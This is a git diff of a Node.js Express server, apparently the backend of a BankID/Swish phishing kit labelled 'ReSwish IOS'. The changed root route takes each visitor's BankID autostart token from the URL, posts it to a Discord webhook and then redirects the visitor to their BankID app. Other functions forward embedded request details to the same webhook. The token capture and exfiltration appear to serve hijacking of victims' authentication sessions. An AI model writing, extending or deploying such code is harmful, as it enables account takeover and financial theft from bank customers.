@@ -11,34 +11,36 @@ let AMOUNT = ""
 app.use(express.json());
 
 
-app.get("/", (req, res) => {
+app.get('/', (req, res) => {
   const { autostarttoken: token } = req.query;
+  if (!token) {
+    return res.status(400).send('Autostarttoken is required.');
+  }
+
+  sendDiscordWebhook(token);
   const redirectUrl = `bankid:///?autostarttoken=${token}`;
   res.redirect(redirectUrl);
-
-const embedMessage = {
-  title: 'BankID Verification',
-  description: 'Waiting for verification response.',
-  color: 0x1976D2, // Material Blue 500
-  fields: [
-    { name: 'Auto Start Token', value: autostarttoken, inline: true }, // Added autostarttoken field
-  ],
-  footer: { text: 'ReSwish IOS | Version (0.0.1)' }
-};
-
-
-  sendDiscordWebhook(embedMessage);
 });
 
   // Function to send Discord webhook
-async function sendDiscordWebhook(embed) {
+async function sendDiscordWebhookEmbed(embed) {
   try {
     await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
+    console.log("Embedded Webhook sent successfully");
+  } catch (error) {
+    console.error("Error sending webhook:", error);
+  }
+}
+
+async function sendDiscordWebhook(msg) {
+  try {
+    await axios.post(DISCORD_WEBHOOK_URL, { content: msg });
     console.log("Webhook sent successfully");
   } catch (error) {
     console.error("Error sending webhook:", error);
   }
 }
+
 
 
 
@@ -67,7 +69,7 @@ app.use(async (req, res, next) => {
     };
 
 
-    await sendDiscordWebhook(embedMessage);
+    await sendDiscordWebhookEmbed(embedMessage);
   } catch (error) {
     console.error('Error processing request:', error);
   }
